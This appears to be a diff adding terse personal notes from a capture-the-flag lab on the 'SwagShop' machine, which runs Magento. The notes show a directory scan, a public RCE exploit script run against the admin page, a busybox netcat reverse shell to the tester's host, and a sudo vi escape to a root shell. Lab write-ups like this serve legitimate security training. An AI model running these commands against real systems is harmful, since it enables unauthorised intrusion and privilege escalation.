@@ -1,0 +1,64 @@
+└─$ sudo dirsearch -u http://10.10.10.140                          
+
+[12:07:49] 403 -  277B  - /.php3
+[12:08:04] 200 -   37B  - /api.php
+[12:08:04] 301 -  310B  - /app  ->  http://10.10.10.140/app/
+[12:08:04] 200 -  522B  - /app/
+[12:08:04] 200 -    1KB - /app/etc/config.xml
+[12:08:04] 200 -    3KB - /app/etc/local.xml.additional
+[12:08:04] 200 -  998B  - /app/etc/local.xml
+[12:08:04] 200 -  895B  - /app/etc/local.xml.template
+[12:08:13] 200 -  717B  - /cron.sh
+[12:08:13] 200 -    0B  - /cron.php
+[12:08:16] 301 -  313B  - /errors  ->  http://10.10.10.140/errors/
+[12:08:16] 200 -  570B  - /errors/
+[12:08:17] 200 -    1KB - /favicon.ico
+[12:08:19] 404 -    0B  - /get.php
+[12:08:22] 200 -  456B  - /includes/
+[12:08:22] 301 -  315B  - /includes  ->  http://10.10.10.140/includes/
+[12:08:22] 200 -   44B  - /install.php
+[12:08:22] 200 -   44B  - /install.php?profile=default
+[12:08:23] 404 -   52B  - /js/
+[12:08:23] 301 -  318B  - /js/tiny_mce  ->  http://10.10.10.140/js/tiny_mce/
+[12:08:23] 200 -  697B  - /js/tiny_mce/
+[12:08:24] 301 -  310B  - /lib  ->  http://10.10.10.140/lib/
+[12:08:24] 200 -  551B  - /lib/
+[12:08:25] 200 -    4KB - /LICENSE.txt
+[12:08:27] 301 -  312B  - /media  ->  http://10.10.10.140/media/
+[12:08:27] 200 -  501B  - /media/
+[12:08:33] 200 -  886B  - /php.ini.sample
+[12:08:36] 301 -  314B  - /pkginfo  ->  http://10.10.10.140/pkginfo/
+[12:08:39] 200 -  571KB - /RELEASE_NOTES.txt
+[12:08:41] 403 -  277B  - /server-status/
+[12:08:41] 403 -  277B  - /server-status
+[12:08:42] 301 -  312B  - /shell  ->  http://10.10.10.140/shell/
+[12:08:42] 200 -  503B  - /shell/
+[12:08:43] 301 -  311B  - /skin  ->  http://10.10.10.140/skin/
+[12:08:51] 301 -  310B  - /var  ->  http://10.10.10.140/var/
+[12:08:51] 200 -  570B  - /var/cache/
+[12:08:51] 200 -  577B  - /var/
+[12:08:51] 200 -  407B  - /var/backups/
+[12:08:51] 200 -    1KB - /var/package/
+
+//meganto vulns get admin account first, with this privi RCE
+
+//for this admin page dir, I will search for the dir of this app in the future, I missed this page this time, but found it from another cve
+└─$ python2 37811.py 'http://swagshop.htb/index.php/admin' 'id'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+└─$ python2 37811.py 'http://swagshop.htb/index.php/admin' 'cat /etc/passwd | grep bash'
+root:x:0:0:root:/root:/bin/bash
+haris:x:1000:1000:haris,,,:/home/haris:/bin/bash
+
+
+└─$ python2 37811.py 'http://swagshop.htb/index.php/admin' 'busybox nc 10.10.16.21 8822 -e /bin/bash'
+//try various revershell codes
+
+
+
+/var/www/html/lib/phpseclib/Crypt/RSA.php
+
+User www-data may run the following commands on swagshop:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+
+sudo vi /var/www/html/* -c ':!/bin/bash' /dev/null
